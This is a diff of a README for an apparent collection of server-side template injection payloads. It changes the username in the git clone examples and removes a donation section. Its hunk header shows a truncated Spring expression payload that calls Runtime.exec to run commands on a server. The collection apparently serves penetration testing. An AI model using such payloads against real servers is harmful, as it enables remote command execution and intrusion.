@@ -78,18 +78,10 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 ##### Cloning an Existing Repository ( Clone with HTTPS )
 ```
-root@ismailtasdelen:~# git clone https://github.com/payloadbox/ssti-payloads.git
+root@fr4nzisko:~# git clone https://github.com/payloadbox/ssti-payloads.git
 ```
 
 ##### Cloning an Existing Repository ( Clone with SSH )
 ```
-root@ismailtasdelen:~# git clone git@github.com:payloadbox/ssti-payloads.git
+root@fr4nzisko:~# git clone git@github.com:payloadbox/ssti-payloads.git
 ```
-
-#### Donate!
-
-Support the authors:
-
-#### LiberaPay:
-
-<noscript><a href="https://liberapay.com/ismailtasdelen/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
